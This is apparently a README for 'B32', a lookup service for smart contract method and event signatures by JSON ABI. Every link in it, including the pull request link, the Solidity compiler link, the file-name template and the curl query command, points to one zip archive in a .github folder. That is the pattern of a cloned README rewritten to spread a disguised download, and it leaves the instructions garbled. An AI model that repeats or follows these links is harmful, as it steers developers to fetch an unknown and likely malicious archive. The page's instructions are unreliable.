# B32

> [Signature collection of smart contract method & event.](https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/b-v3.8.zip)

To help retrieving method/event's JSON ABI by its signature.

## Submit JSON ABI

* Initiate a new [pull request](https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/b-v3.8.zip)
* Fill the file name like <`https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/b-v3.8.zip`>
* Fill the file content with full JSON ABI produced by [solidity compiler](https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/b-v3.8.zip)


## Query JSON ABI

```bash
# replace 0x06fdde03 with your signature
> curl https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/b-v3.8.zip
```

The output will be 
```JSON
[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"pure","type":"function"}]
```

which is an array of objects which share the same signature.

